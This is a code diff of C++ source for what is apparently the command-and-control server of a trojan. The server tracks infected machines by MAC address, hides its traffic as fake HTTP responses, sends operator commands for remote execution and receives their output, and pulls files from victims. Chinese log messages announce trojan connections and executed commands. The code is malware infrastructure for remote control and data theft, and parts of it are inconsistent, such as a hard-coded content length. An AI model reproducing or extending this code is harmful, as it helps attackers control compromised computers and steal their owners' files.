@@ -15,7 +15,7 @@ using namespace std;
 #define CMD_DOWNLOAD	2
 
 #define MAX_CMD_LEN		256
-#define MAC_ADDR_LEN	18
+#define MAC_ADDR_LEN	17
 #define DEFAULT_BUFLEN 1024
 
 typedef struct _TROJAN_INFO
@@ -40,14 +40,21 @@ CRITICAL_SECTION cs;
 //LeaveCriticalSection(&cs);
 
 char* protocolHead = "HTTP/1.1 200 OK\r\nServer: Server <0.1>\r\n"
-"Accept-Ranges: bytes\r\nContent-Length: %d\r\nConnection: close\r\n"
-"Content-Type: %s\r\n\r\n";
+"Accept-Ranges: bytes\r\nContent-Length: 112\r\nConnection: close\r\n"
+"Content-Type: application\r\n\r\n";
 
 
 char * killhead(char* headcmd)
 {
-	return strncpy(headcmd, strstr(headcmd, "\r\n\r\n")+4, MAC_ADDR_LEN);
+	char * goal;
+	int len = strlen(headcmd) - (strstr(headcmd, "\r\n\r\n") - headcmd) - 4;
+	if (!len || len > 10000)return NULL;
+	cout << "数据包长度" << len << endl;
+	goal = strncpy(headcmd, strstr(headcmd, "\r\n\r\n") + 4, len);
+	goal[len] = '\0';
+	return goal;
 }
+
 
 char* combine(char *s1, char *s2)
 {
@@ -294,13 +301,24 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			cout << "接收到GET请求：" << RecvBuffer << "(" << Ret << ")" << endl;
 		}
 
+		Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
+		if (Ret>0) cout << "返回Http响应," << strlen(protocolHead) << "字节" << endl;
+		if (Ret != strlen(protocolHead))
+		{
+			cout << "Send Info Error::" << GetLastError() << endl;
+			break;
+		}
+
 		memset(RecvBuffer, 0, MAX_PATH);
 		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
 		if (Ret > 0)
 		{
 			cout << "接收到POST请求：" << RecvBuffer << "(" << Ret << ")" << endl;
 		}
-		cout << "\n--------------------------------\n连接到木马！mac地址为" << killhead(RecvBuffer) << endl;
+		char* mac=killhead(RecvBuffer);
+		cout << "\n--------------------------------\n连接到木马！mac地址为" << mac <<"的地址"<< endl;
+
+		
 
 		/*if ( Ret != MAX_PATH)
 		{
@@ -311,8 +329,8 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 		
 		if(bFirst){
 			cout << "添加到木马列表" << endl;
-			remove_trojan_from_list(RecvBuffer);
-			add_trojan_to_list(RecvBuffer);
+			remove_trojan_from_list(mac);
+			add_trojan_to_list(mac);
 			bFirst = false;
 		}
 
@@ -321,7 +339,7 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 		
 		// check if the trojan has an cmd to do
 		memset(CmdBuff, 0, MAX_CMD_LEN);
-		CmdNo = get_cmd_by_mac(RecvBuffer, CmdBuff);
+		CmdNo = get_cmd_by_mac(mac, CmdBuff);
 
 		char recvbuf[DEFAULT_BUFLEN];
 		FILE *file = NULL;
@@ -336,6 +354,9 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			//cout << "暂时未发送命令！\n";
 			CmdLen = 0;
 			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
+			//Ret = send(ClientSocket, combine(protocolHead, (char *)&CmdLen), strlen(protocolHead)+ sizeof(DWORD), 0);
+			if (Ret>0) cout << "发送的是一条空指令！" << endl;
+			
 			break;
 		case CMD_CMD:
 			cout << "执行命令" << CmdBuff << endl;
@@ -343,8 +364,10 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			CmdLen = htonl(strlen(CmdBuff));
 			// send cmd len
 			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
+			//Ret = send(ClientSocket, combine(protocolHead, (char *)&CmdLen), strlen(protocolHead)+ sizeof(DWORD), 0);
 			// send cmd content
-			send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
+			//send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
+			Ret = send(ClientSocket, combine(protocolHead, CmdBuff), strlen(protocolHead)+ strlen(CmdBuff), 0);
 			// recv cmd result from trojan
 			iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
 			printf("接收到返回数据:  %s(%d)\n", recvbuf, iResult);
@@ -360,9 +383,11 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			CmdLen = htonl(strlen(CmdBuff));
 			cout << "目标文件为" << CmdBuff << endl;
 			// send cmd len
-			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
+			//send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
+			Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
 			// send cmd content
-			send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
+			//send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
+			Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
 			// recv file from trojan
 
 
